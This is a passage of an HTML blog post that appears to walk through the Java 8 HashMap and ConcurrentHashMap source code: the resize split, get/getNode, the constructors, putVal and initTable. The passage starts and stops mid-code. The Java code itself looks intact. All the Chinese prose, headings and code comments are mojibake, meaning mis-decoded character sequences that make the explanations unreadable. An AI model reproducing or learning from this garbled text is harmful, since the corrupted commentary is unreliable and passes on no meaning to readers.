class="comment">// éœ€è¦å°†æ­¤é“¾è¡¨æ‹†æˆä¸¤ä¸ªé“¾è¡¨ï¼Œæ”¾åˆ°æ–°çš„æ•°ç»„ä¸­ï¼Œå¹¶ä¸”ä¿ç•™åŸæ¥çš„å…ˆåé¡ºåº</span></span><br><span class="line">                    <span class="comment">// loHeadã€loTail å¯¹åº”ä¸€æ¡é“¾è¡¨ï¼ŒhiHeadã€hiTail å¯¹åº”å¦ä¸€æ¡é“¾è¡¨ï¼Œä»£ç è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„</span></span><br><span class="line">                    Node&lt;K,V&gt; loHead = <span class="literal">null</span>, loTail = <span class="literal">null</span>;</span><br><span class="line">                    Node&lt;K,V&gt; hiHead = <span class="literal">null</span>, hiTail = <span class="literal">null</span>;</span><br><span class="line">                    Node&lt;K,V&gt; next;</span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        next = e.next;</span><br><span class="line">                        <span class="keyword">if</span> ((e.hash &amp; oldCap) == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (loTail == <span class="literal">null</span>)</span><br><span class="line">                                loHead = e;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                loTail.next = e;</span><br><span class="line">                            loTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> (hiTail == <span class="literal">null</span>)</span><br><span class="line">                                hiHead = e;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                hiTail.next = e;</span><br><span class="line">                            hiTail = e;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">while</span> ((e = next) != <span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">if</span> (loTail != <span class="literal">null</span>) &#123;</span><br><span class="line">                        loTail.next = <span class="literal">null</span>;</span><br><span class="line">                        <span class="comment">// ç¬¬ä¸€æ¡é“¾è¡¨</span></span><br><span class="line">                        newTab[j] = loHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (hiTail != <span class="literal">null</span>) &#123;</span><br><span class="line">                        hiTail.next = <span class="literal">null</span>;</span><br><span class="line">                        <span class="comment">// ç¬¬äºŒæ¡é“¾è¡¨çš„æ–°çš„ä½ç½®æ˜¯ j + oldCapï¼Œè¿™ä¸ªå¾ˆå¥½ç†è§£</span></span><br><span class="line">                        newTab[j + oldCap] = hiHead;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newTab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="get-è¿‡ç¨‹åˆ†æ">get è¿‡ç¨‹åˆ†æ</span></h3><p>ç›¸å¯¹äº put æ¥è¯´ï¼Œget çœŸçš„å¤ªç®€å•äº†ã€‚</p><ol><li>è®¡ç®— key çš„ hash å€¼ï¼Œæ ¹æ® hash å€¼æ‰¾åˆ°å¯¹åº”æ•°ç»„ä¸‹æ ‡: hash &amp; (length-1)</li><li>åˆ¤æ–­æ•°ç»„è¯¥ä½ç½®å¤„çš„å…ƒç´ æ˜¯å¦åˆšå¥½å°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„ï¼Œå¦‚æœä¸æ˜¯ï¼Œèµ°ç¬¬ä¸‰æ­¥</li><li>åˆ¤æ–­è¯¥å…ƒç´ ç±»å‹æ˜¯å¦æ˜¯ TreeNodeï¼Œå¦‚æœæ˜¯ï¼Œç”¨çº¢é»‘æ ‘çš„æ–¹æ³•å–æ•°æ®ï¼Œå¦‚æœä¸æ˜¯ï¼Œèµ°ç¬¬å››æ­¥</li><li>éå†é“¾è¡¨ï¼Œç›´åˆ°æ‰¾åˆ°ç›¸ç­‰(&#x3D;&#x3D;æˆ–equals)çš„ key</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt; e;</span><br><span class="line">    <span class="keyword">return</span> (e = getNode(hash(key), key)) == <span class="literal">null</span> ? <span class="literal">null</span> : e.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Node&lt;K,V&gt; <span class="title function_">getNode</span><span class="params">(<span class="type">int</span> hash, Object key)</span> &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; first, e; <span class="type">int</span> n; K k;</span><br><span class="line">    <span class="keyword">if</span> ((tab = table) != <span class="literal">null</span> &amp;&amp; (n = tab.length) &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (first = tab[(n - <span class="number">1</span>) &amp; hash]) != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// åˆ¤æ–­ç¬¬ä¸€ä¸ªèŠ‚ç‚¹æ˜¯ä¸æ˜¯å°±æ˜¯éœ€è¦çš„</span></span><br><span class="line">        <span class="keyword">if</span> (first.hash == hash &amp;&amp; <span class="comment">// always check first node</span></span><br><span class="line">            ((k = first.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">            <span class="keyword">return</span> first;</span><br><span class="line">        <span class="keyword">if</span> ((e = first.next) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// åˆ¤æ–­æ˜¯å¦æ˜¯çº¢é»‘æ ‘</span></span><br><span class="line">            <span class="keyword">if</span> (first <span class="keyword">instanceof</span> TreeNode)</span><br><span class="line">                <span class="keyword">return</span> ((TreeNode&lt;K,V&gt;)first).getTreeNode(hash, key);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// é“¾è¡¨éå†</span></span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != <span class="literal">null</span> &amp;&amp; key.equals(k))))</span><br><span class="line">                    <span class="keyword">return</span> e;</span><br><span class="line">            &#125; <span class="keyword">while</span> ((e = e.next) != <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="java8-concurrenthashmap">Java8 ConcurrentHashMap</span></h2><p>Java7 ä¸­å®ç°çš„ ConcurrentHashMap è¯´å®è¯è¿˜æ˜¯æ¯”è¾ƒå¤æ‚çš„ï¼ŒJava8 å¯¹ ConcurrentHashMap è¿›è¡Œäº†æ¯”è¾ƒå¤§çš„æ”¹åŠ¨ã€‚å»ºè®®è¯»è€…å¯ä»¥å‚è€ƒ Java8 ä¸­ HashMap ç›¸å¯¹äº Java7 HashMap çš„æ”¹åŠ¨ï¼Œå¯¹äº ConcurrentHashMapï¼ŒJava8 ä¹Ÿå¼•å…¥äº†çº¢é»‘æ ‘ã€‚</p><p><strong>è¯´å®è¯ï¼ŒJava8 ConcurrentHashMap æºç çœŸå¿ƒä¸ç®€å•ï¼Œæœ€éš¾çš„åœ¨äºæ‰©å®¹ï¼Œæ•°æ®è¿ç§»æ“ä½œä¸å®¹æ˜“çœ‹æ‡‚ã€‚</strong></p><p>æˆ‘ä»¬å…ˆç”¨ä¸€ä¸ªç¤ºæ„å›¾æ¥æè¿°ä¸‹å…¶ç»“æ„ï¼š</p><p><img src="https://www.javadoop.com/blogimages/map/4.png" alt="4"></p><p>ç»“æ„ä¸Šå’Œ Java8 çš„ HashMap åŸºæœ¬ä¸Šä¸€æ ·ï¼Œä¸è¿‡å®ƒè¦ä¿è¯çº¿ç¨‹å®‰å…¨æ€§ï¼Œæ‰€ä»¥åœ¨æºç ä¸Šç¡®å®è¦å¤æ‚ä¸€äº›ã€‚</p><h3><span id="åˆå§‹åŒ–">åˆå§‹åŒ–</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿™æ„é€ å‡½æ•°é‡Œï¼Œä»€ä¹ˆéƒ½ä¸å¹²</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ConcurrentHashMap</span><span class="params">()</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConcurrentHashMap</span><span class="params">(<span class="type">int</span> initialCapacity)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">    <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((initialCapacity &gt;= (MAXIMUM_CAPACITY &gt;&gt;&gt; <span class="number">1</span>)) ?</span><br><span class="line">               MAXIMUM_CAPACITY :</span><br><span class="line">               tableSizeFor(initialCapacity + (initialCapacity &gt;&gt;&gt; <span class="number">1</span>) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">this</span>.sizeCtl = cap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåˆå§‹åŒ–æ–¹æ³•æœ‰ç‚¹æ„æ€ï¼Œé€šè¿‡æä¾›åˆå§‹å®¹é‡ï¼Œè®¡ç®—äº† sizeCtlï¼ŒsizeCtl &#x3D; ã€ (1.5 * initialCapacity + 1)ï¼Œç„¶åå‘ä¸Šå–æœ€è¿‘çš„ 2 çš„ n æ¬¡æ–¹ã€‘ã€‚å¦‚ initialCapacity ä¸º 10ï¼Œé‚£ä¹ˆå¾—åˆ° sizeCtl ä¸º 16ï¼Œå¦‚æœ initialCapacity ä¸º 11ï¼Œå¾—åˆ° sizeCtl ä¸º 32ã€‚</p><p>sizeCtl è¿™ä¸ªå±æ€§ä½¿ç”¨çš„åœºæ™¯å¾ˆå¤šï¼Œä¸è¿‡åªè¦è·Ÿç€æ–‡ç« çš„æ€è·¯æ¥ï¼Œå°±ä¸ä¼šè¢«å®ƒææ™•äº†ã€‚</p><p>å¦‚æœä½ çˆ±æŠ˜è…¾ï¼Œä¹Ÿå¯ä»¥çœ‹ä¸‹å¦ä¸€ä¸ªæœ‰ä¸‰ä¸ªå‚æ•°çš„æ„é€ æ–¹æ³•ï¼Œè¿™é‡Œæˆ‘å°±ä¸è¯´äº†ï¼Œå¤§éƒ¨åˆ†æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨æ— å‚æ„é€ å‡½æ•°è¿›è¡Œå®ä¾‹åŒ–ï¼Œæˆ‘ä»¬ä¹ŸæŒ‰ç…§è¿™ä¸ªæ€è·¯æ¥è¿›è¡Œæºç åˆ†æå§ã€‚</p><h3><span id="put-è¿‡ç¨‹åˆ†æ">put è¿‡ç¨‹åˆ†æ</span></h3><p>ä»”ç»†åœ°ä¸€è¡Œä¸€è¡Œä»£ç çœ‹ä¸‹å»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(key, value, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(K key, V value, <span class="type">boolean</span> onlyIfAbsent)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span> || value == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    <span class="comment">// å¾—åˆ° hash å€¼</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> spread(key.hashCode());</span><br><span class="line">    <span class="comment">// ç”¨äºè®°å½•ç›¸åº”é“¾è¡¨çš„é•¿åº¦</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">binCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Node&lt;K,V&gt;[] tab = table;;) &#123;</span><br><span class="line">        Node&lt;K,V&gt; f; <span class="type">int</span> n, i, fh;</span><br><span class="line">        <span class="comment">// å¦‚æœæ•°ç»„&quot;ç©º&quot;ï¼Œè¿›è¡Œæ•°ç»„åˆå§‹åŒ–</span></span><br><span class="line">        <span class="keyword">if</span> (tab == <span class="literal">null</span> || (n = tab.length) == <span class="number">0</span>)</span><br><span class="line">            <span class="comment">// åˆå§‹åŒ–æ•°ç»„ï¼Œåé¢ä¼šè¯¦ç»†ä»‹ç»</span></span><br><span class="line">            tab = initTable();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// æ‰¾è¯¥ hash å€¼å¯¹åº”çš„æ•°ç»„ä¸‹æ ‡ï¼Œå¾—åˆ°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ f</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((f = tabAt(tab, i = (n - <span class="number">1</span>) &amp; hash)) == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœæ•°ç»„è¯¥ä½ç½®ä¸ºç©ºï¼Œ</span></span><br><span class="line">            <span class="comment">//    ç”¨ä¸€æ¬¡ CAS æ“ä½œå°†è¿™ä¸ªæ–°å€¼æ”¾å…¥å…¶ä¸­å³å¯ï¼Œè¿™ä¸ª put æ“ä½œå·®ä¸å¤šå°±ç»“æŸäº†ï¼Œå¯ä»¥æ‹‰åˆ°æœ€åé¢äº†</span></span><br><span class="line">            <span class="comment">//  å¦‚æœ CAS å¤±è´¥ï¼Œé‚£å°±æ˜¯æœ‰å¹¶å‘æ“ä½œï¼Œè¿›åˆ°ä¸‹ä¸€ä¸ªå¾ªç¯å°±å¥½äº†</span></span><br><span class="line">            <span class="keyword">if</span> (casTabAt(tab, i, <span class="literal">null</span>,</span><br><span class="line">                         <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(hash, key, value, <span class="literal">null</span>)))</span><br><span class="line">                <span class="keyword">break</span>;                   <span class="comment">// no lock when adding to empty bin</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// hash å±…ç„¶å¯ä»¥ç­‰äº MOVEDï¼Œè¿™ä¸ªéœ€è¦åˆ°åé¢æ‰èƒ½çœ‹æ˜ç™½ï¼Œä¸è¿‡ä»åå­—ä¸Šä¹Ÿèƒ½çŒœåˆ°ï¼Œè‚¯å®šæ˜¯å› ä¸ºåœ¨æ‰©å®¹</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((fh = f.hash) == MOVED)</span><br><span class="line">            <span class="comment">// å¸®åŠ©æ•°æ®è¿ç§»ï¼Œè¿™ä¸ªç­‰åˆ°çœ‹å®Œæ•°æ®è¿ç§»éƒ¨åˆ†çš„ä»‹ç»åï¼Œå†ç†è§£è¿™ä¸ªå°±å¾ˆç®€å•äº†</span></span><br><span class="line">            tab = helpTransfer(tab, f);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// åˆ°è¿™é‡Œå°±æ˜¯è¯´ï¼Œf æ˜¯è¯¥ä½ç½®çš„å¤´ç»“ç‚¹ï¼Œè€Œä¸”ä¸ä¸ºç©º</span></span><br><span class="line">            </span><br><span class="line">            <span class="type">V</span> <span class="variable">oldVal</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// è·å–æ•°ç»„è¯¥ä½ç½®çš„å¤´ç»“ç‚¹çš„ç›‘è§†å™¨é”</span></span><br><span class="line">            <span class="keyword">synchronized</span> (f) &#123;</span><br><span class="line">                <span class="keyword">if</span> (tabAt(tab, i) == f) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (fh &gt;= <span class="number">0</span>) &#123; <span class="comment">// å¤´ç»“ç‚¹çš„ hash å€¼å¤§äº 0ï¼Œè¯´æ˜æ˜¯é“¾è¡¨</span></span><br><span class="line">                        <span class="comment">// ç”¨äºç´¯åŠ ï¼Œè®°å½•é“¾è¡¨çš„é•¿åº¦</span></span><br><span class="line">                        binCount = <span class="number">1</span>;</span><br><span class="line">                        <span class="comment">// éå†é“¾è¡¨</span></span><br><span class="line">                        <span class="keyword">for</span> (Node&lt;K,V&gt; e = f;; ++binCount) &#123;</span><br><span class="line">                            K ek;</span><br><span class="line">                            <span class="comment">// å¦‚æœå‘ç°äº†&quot;ç›¸ç­‰&quot;çš„ keyï¼Œåˆ¤æ–­æ˜¯å¦è¦è¿›è¡Œå€¼è¦†ç›–ï¼Œç„¶åä¹Ÿå°±å¯ä»¥ break äº†</span></span><br><span class="line">                            <span class="keyword">if</span> (e.hash == hash &amp;&amp;</span><br><span class="line">                                ((ek = e.key) == key ||</span><br><span class="line">                                 (ek != <span class="literal">null</span> &amp;&amp; key.equals(ek)))) &#123;</span><br><span class="line">                                oldVal = e.val;</span><br><span class="line">                                <span class="keyword">if</span> (!onlyIfAbsent)</span><br><span class="line">                                    e.val = value;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// åˆ°äº†é“¾è¡¨çš„æœ€æœ«ç«¯ï¼Œå°†è¿™ä¸ªæ–°å€¼æ”¾åˆ°é“¾è¡¨çš„æœ€åé¢</span></span><br><span class="line">                            Node&lt;K,V&gt; pred = e;</span><br><span class="line">                            <span class="keyword">if</span> ((e = e.next) == <span class="literal">null</span>) &#123;</span><br><span class="line">                                pred.next = <span class="keyword">new</span> <span class="title class_">Node</span>&lt;K,V&gt;(hash, key,</span><br><span class="line">                                                          value, <span class="literal">null</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (f <span class="keyword">instanceof</span> TreeBin) &#123; <span class="comment">// çº¢é»‘æ ‘</span></span><br><span class="line">                        Node&lt;K,V&gt; p;</span><br><span class="line">                        binCount = <span class="number">2</span>;</span><br><span class="line">                        <span class="comment">// è°ƒç”¨çº¢é»‘æ ‘çš„æ’å€¼æ–¹æ³•æ’å…¥æ–°èŠ‚ç‚¹</span></span><br><span class="line">                        <span class="keyword">if</span> ((p = ((TreeBin&lt;K,V&gt;)f).putTreeVal(hash, key,</span><br><span class="line">                                                       value)) != <span class="literal">null</span>) &#123;</span><br><span class="line">                            oldVal = p.val;</span><br><span class="line">                            <span class="keyword">if</span> (!onlyIfAbsent)</span><br><span class="line">                                p.val = value;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (binCount != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// åˆ¤æ–­æ˜¯å¦è¦å°†é“¾è¡¨è½¬æ¢ä¸ºçº¢é»‘æ ‘ï¼Œä¸´ç•Œå€¼å’Œ HashMap ä¸€æ ·ï¼Œä¹Ÿæ˜¯ 8</span></span><br><span class="line">                <span class="keyword">if</span> (binCount &gt;= TREEIFY_THRESHOLD)</span><br><span class="line">                    <span class="comment">// è¿™ä¸ªæ–¹æ³•å’Œ HashMap ä¸­ç¨å¾®æœ‰ä¸€ç‚¹ç‚¹ä¸åŒï¼Œé‚£å°±æ˜¯å®ƒä¸æ˜¯ä¸€å®šä¼šè¿›è¡Œçº¢é»‘æ ‘è½¬æ¢ï¼Œ</span></span><br><span class="line">                    <span class="comment">// å¦‚æœå½“å‰æ•°ç»„çš„é•¿åº¦å°äº 64ï¼Œé‚£ä¹ˆä¼šé€‰æ‹©è¿›è¡Œæ•°ç»„æ‰©å®¹ï¼Œè€Œä¸æ˜¯è½¬æ¢ä¸ºçº¢é»‘æ ‘</span></span><br><span class="line">                    <span class="comment">//    å…·ä½“æºç æˆ‘ä»¬å°±ä¸çœ‹äº†ï¼Œæ‰©å®¹éƒ¨åˆ†åé¢è¯´</span></span><br><span class="line">                    treeifyBin(tab, i);</span><br><span class="line">                <span class="keyword">if</span> (oldVal != <span class="literal">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> oldVal;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    addCount(<span class="number">1L</span>, binCount);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>put çš„ä¸»æµç¨‹çœ‹å®Œäº†ï¼Œä½†æ˜¯è‡³å°‘ç•™ä¸‹äº†å‡ ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€ä¸ªæ˜¯åˆå§‹åŒ–ï¼Œç¬¬äºŒä¸ªæ˜¯æ‰©å®¹ï¼Œç¬¬ä¸‰ä¸ªæ˜¯å¸®åŠ©æ•°æ®è¿ç§»ï¼Œè¿™äº›æˆ‘ä»¬éƒ½ä¼šåœ¨åé¢è¿›è¡Œä¸€ä¸€ä»‹ç»ã€‚</p><h4><span id="åˆå§‹åŒ–æ•°ç»„inittable">åˆå§‹åŒ–æ•°ç»„ï¼šinitTable</span></h4><p>è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯åˆå§‹åŒ–ä¸€ä¸ª<strong>åˆé€‚å¤§å°</strong>çš„æ•°ç»„ï¼Œç„¶åä¼šè®¾ç½® sizeCtlã€‚</p><p>åˆå§‹åŒ–æ–¹æ³•ä¸­çš„å¹¶å‘é—®é¢˜æ˜¯é€šè¿‡å¯¹ sizeCtl è¿›è¡Œä¸€ä¸ª CAS æ“ä½œæ¥æ§åˆ¶çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Node&lt;K,V&gt;[] initTable() &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; <span class="type">int</span> sc;</span><br><span class="line">    <span class="keyword">while</span> ((tab = table) == <span class="literal">null</span> || tab.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// åˆå§‹åŒ–çš„&quot;åŠŸåŠ³&quot;è¢«å…¶ä»–çº¿ç¨‹&quot;æŠ¢å»&quot;äº†</span></span><br><span class="line">        <span class="keyword">if</span> ((sc = sizeCtl) &lt; <span class="number">0</span>)</span><br><span class="line">            Thread.<span class="keyword">yield</span>(); <span class="comment">// lost initialization race; just spin</span></span><br><span class="line">        <span class="comment">// CAS ä¸€ä¸‹ï¼Œå°† sizeCtl è®¾ç½®ä¸º -1ï¼Œä»£è¡¨æŠ¢åˆ°äº†é”</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (U.compareAndSwapInt(<span class="built_in">this</span>, SIZECTL, sc, -<span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ((tab = table) == <span class="literal">null</span> || tab.length == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// DEFAULT_CAPACITY é»˜è®¤åˆå§‹å®¹é‡æ˜¯ 16</span></span><br><span class="line">                    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> (sc &gt; <span class="number">0</span>) ? sc : DEFAULT_CAPACITY;</span><br><span class="line"><span class="comment">// åˆå§‹åŒ–æ•°ç»„ï¼Œé•¿åº¦ä¸º 16 æˆ–åˆå§‹åŒ–æ—¶æä¾›çš„é•¿åº¦</span></span><br><span class="line">                    Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>&lt;?,?&gt;[n];</span><br><span class="line">                    <span class="comment">// å°†è¿™ä¸ªæ•°ç»„èµ‹å€¼ç»™ tableï¼Œtable æ˜¯ volatile çš„</span></span><br><span class="line">                    table = tab = nt;</span><br><span class="line">                    <span class="comment">// å¦‚æœ n ä¸º 16 çš„è¯ï¼Œé‚£ä¹ˆè¿™é‡Œ sc = 12</span></span><br><span class="line">                    <span class="comment">// å…¶å®å°±æ˜¯ 0.75 * n</span></span><br><span class="line">                    sc = n - (n &gt;&gt;&gt; <span class="number">2</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// è®¾ç½® sizeCtl ä¸º scï¼Œæˆ‘ä»¬å°±å½“æ˜¯ 12 å§</span></span><br><span class="line">                sizeCtl = sc;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="é“¾è¡¨è½¬çº¢é»‘æ ‘-treeifybin">é“¾è¡¨è½¬çº¢é»‘æ ‘: treeifyBin</span></h4><p>å‰é¢æˆ‘ä»¬åœ¨ put æºç åˆ†æä¹Ÿè¯´è¿‡ï¼ŒtreeifyBin ä¸ä¸€å®šå°±ä¼šè¿›è¡Œçº¢é»‘æ ‘è½¬æ¢ï¼Œä¹Ÿå¯èƒ½æ˜¯ä»…ä»…åšæ•°ç»„æ‰©å®¹ã€‚æˆ‘ä»¬è¿˜æ˜¯è¿›è¡Œæºç åˆ†æå§ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 